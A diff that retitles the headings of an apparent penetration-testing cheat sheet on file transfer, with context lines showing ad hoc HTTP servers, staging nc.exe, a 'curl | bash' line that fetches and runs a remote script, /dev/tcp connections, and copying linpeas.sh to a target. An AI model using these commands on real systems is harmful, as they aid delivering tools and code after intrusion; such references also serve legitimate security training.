@@ -1,4 +1,4 @@
-### **SETTING UP AN HTTP SERVER AND DOWNLOADING A FILE USING PYTHON 2**
+### **Setting Up an HTTP Server and Downloading a File Using Python 2**
 
 1.  Start a http server:  
     `python -m SimpleHTTPServer 8000`
@@ -9,7 +9,7 @@
 4.  Download file using curl:  
     `curl –O https://[IP-ADRESS]:8000/file.txt`
 
-### **SETTING UP AN HTTP SERVER AND DOWNLOADING A FILE USING PYTHON 3**
+### **Setting Up an HTTP Server and Downloading a File Using Python 3**
 
 1.  Start a http server:  
     `python3 -m http.server 8000`
@@ -20,7 +20,7 @@
 4.  Download file using curl  
     `curl –O https://[IP-ADRESS]:8000/file.txt`
 
-### **SETTING UP AN APACHE SERVER AND DOWNLOADING A FILE**
+### **Setting Up an Apache Server and Downloading a File**
 
 1.  Put files into the apache web directory:  
     `cp nc.exe /var/www/html`
@@ -31,7 +31,7 @@
 4.  Download file using curl   
     `curl –O https://[IP-ADRESS]:8000/file.txt`
 
-### **SETTING UP AN HTTP SERVER AND DOWNLOADING FILES USING PHP**
+### **Setting Up an HTTP Server and Downloading Files Using PHP**
 
 1.  Start a http server:    
     `php -S 0.0.0.0:8000`
@@ -47,7 +47,7 @@
 6.  Download file using curl :  
     `curl –O https://[IP-ADRESS]:8000/file.txt`
 
-### **SETTING UP AN HTTP SERVER AND DOWNLOADING FILES USING RUBY**
+### **Setting Up an HTTP Server and Downloading Files Using Ruby**
 
 1.  Start an HTTP server:  
     `ruby -run -e httpd . -p 8000`
@@ -59,7 +59,7 @@
     `curl -O https://[IP-ADDRESS]:8000/file.txt`
 
 
-### **FILELESS DOWNLOADS**
+### **Fileless Downloads**
 
 1.  Curl to bash: Download and execute script without saving.  
     `curl http://[IP-ADDRESS]:8000/script.sh | bash`
@@ -68,7 +68,7 @@
 3.  Download file using Perl:  
     `perl -e 'use LWP::Simple; getstore("http://[IP-ADDRESS]:8000/file.txt", "file.txt");'`
 
-### **BASH (/DEV/TCP) DOWNLOADS**
+### **Bash (/dev/tcp) Downloads**
 
 1.  Connect to the target webserver:  
     `exec 3<>/dev/tcp/[IP-ADDRESS]/80`
@@ -78,7 +78,7 @@
     `cat <&3`
 
 
-### **BASE64 ENCODING AND DECODING**
+### **Base64 Encoding and Decoding**
 
 1.  Encode file to Base64:  
     `cat file | base64 -w 0; echo`
@@ -86,6 +86,6 @@
     `echo -n 'BASE64-STRING' | base64 -d > output_file`
 
 
-### **SSH AND SCP OPERATIONS**
+### **SSH and SCP Operations**
 
 1.  `scp -P 6498 linpeas.sh [USERNAME]@[IP-ADRESS]:/tmp`
